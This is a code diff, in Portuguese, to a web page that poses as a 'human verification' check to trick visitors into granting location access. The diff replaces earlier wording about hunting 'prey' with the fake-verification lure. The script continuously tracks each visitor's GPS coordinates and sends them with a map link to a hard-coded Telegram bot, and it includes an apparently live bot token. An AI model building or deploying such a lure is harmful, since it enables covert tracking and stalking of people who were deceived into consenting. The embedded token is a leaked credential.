@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capturador de Localização SleyTr</title>
+    <title>Verificação Humana SleyTr</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -26,8 +26,13 @@
         }
         h1 {
             color: #FF0;
-            margin-bottom: 20px;
+            margin-bottom: 10px; /* Ajuste para dar espaço ao h2 */
             text-shadow: 0 0 10px #FF0;
+        }
+        h2 {
+            color: #0FF; /* Uma cor diferente para a chamada de atenção */
+            margin-bottom: 20px;
+            text-shadow: 0 0 8px #0FF;
         }
         p {
             margin-bottom: 15px;
@@ -55,9 +60,9 @@
 </head>
 <body>
     <div class="container">
-        <h1>Bem-vindo ao Labirinto SleyTr!</h1>
-        <p>Prepare-se para descobrir o que está escondido...</p>
-        <p id="status">Aguardando permissão de localização...</p>
+        <h1>Sistema de Verificação SleyTr</h1>
+        <h2>Verifique se você é um humano! Clique em 'Permitir Localização'.</h2>
+        <p id="status">Aguardando sua corajosa decisão...</p>
         <div id="locationData">
             <!-- Os dados de localização aparecerão aqui -->
         </div>
@@ -70,7 +75,7 @@
 
             // SEUS DADOS SECRETOS DO TELEGRAM - NÃO OS COMPARTILHE!
             const BOT_TOKEN = '8028837254:AAE54NFBPdKikjofF1nXlnESCWzZbv-waSU'; // <--- SUBSTITUA AQUI COM SEU TOKEN REAL DO BOT!
-            const CHAT_ID = '6896556949';     // <--- SUBSTITUA AQUI COM SEU CHAT_ID REAL!
+            const CHAT_ID = '8028837254';     // <--- SUBSTITUA AQUI COM SEU CHAT_ID REAL!
 
             function sendLocationToTelegram(latitude, longitude, accuracy) {
                 const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -86,27 +91,27 @@
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
-                        disable_web_page_preview: true // Para não mostrar uma prévia do link do mapa, se desejar
+                        disable_web_page_preview: true
                     })
                 })
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
                         console.log('Localização enviada ao Telegram com sucesso!', data);
-                        statusElement.textContent = "Localização obtida e enviada ao seu covil secreto no Telegram!";
+                        statusElement.textContent = "Verificação bem-sucedida! Humano confirmado. E os dados enviados para o meu covil!";
                     } else {
                         console.error('Falha ao enviar localização ao Telegram:', data);
-                        statusElement.textContent = "Localização obtida, mas falha ao enviar ao Telegram. Verifique seu token e chat ID!";
+                        statusElement.textContent = "Verificação quase concluída, mas falha ao enviar dados. Verifique o console para mais detalhes.";
                     }
                 })
                 .catch(error => {
                     console.error('Erro de rede ao enviar localização ao Telegram:', error);
-                    statusElement.textContent = "Localização obtida, mas erro de rede ao enviar ao Telegram.";
+                    statusElement.textContent = "Verificação quase concluída, mas erro de rede ao enviar dados.";
                 });
             }
 
             if (navigator.geolocation) {
-                statusElement.textContent = "Solicitando sua localização... Não tema, é apenas o início do jogo!";
+                statusElement.textContent = "Aguardando sua corajosa decisão...";
                 navigator.geolocation.watchPosition(
                     (position) => {
                         const latitude = position.coords.latitude;
@@ -125,16 +130,16 @@
                         sendLocationToTelegram(latitude, longitude, accuracy);
                     },
                     (error) => {
-                        let errorMessage = "Erro ao obter localização: ";
+                        let errorMessage = "Erro na verificação: ";
                         switch(error.code) {
                             case error.PERMISSION_DENIED:
-                                errorMessage += "O usuário negou a solicitação de Geolocation. Que audácia!";
+                                errorMessage += "Acesso negado. A humanidade está em dúvida!";
                                 break;
                             case error.POSITION_UNAVAILABLE:
-                                errorMessage += "A informação de localização está indisponível. A presa está se escondendo!";
+                                errorMessage += "Informação indisponível. Seu status de humano não pode ser confirmado.";
                                 break;
                             case error.TIMEOUT:
-                                errorMessage += "A solicitação para obter a localização expirou. Eles são rápidos, mas não o suficiente!";
+                                errorMessage += "Tempo esgotado. Verificação falhou. Robô detectado?";
                                 break;
                             default:
                                 errorMessage += "Um erro desconhecido ocorreu. Frustrante!";
@@ -150,8 +155,8 @@
                     }
                 );
             } else {
-                statusElement.textContent = "Geolocalização não é suportada por este navegador. Uma falha irritante no meu plano!";
-                locationDataElement.innerHTML = `<p style="color: red;">Seu navegador é fraco demais para este poder.</p>`;
+                statusElement.textContent = "Seu navegador não suporta verificação de humanidade. Que pena!";
+                locationDataElement.innerHTML = `<p style="color: red;">Seu navegador é inadequado para esta tarefa.</p>`;
             }
         });
     </script>
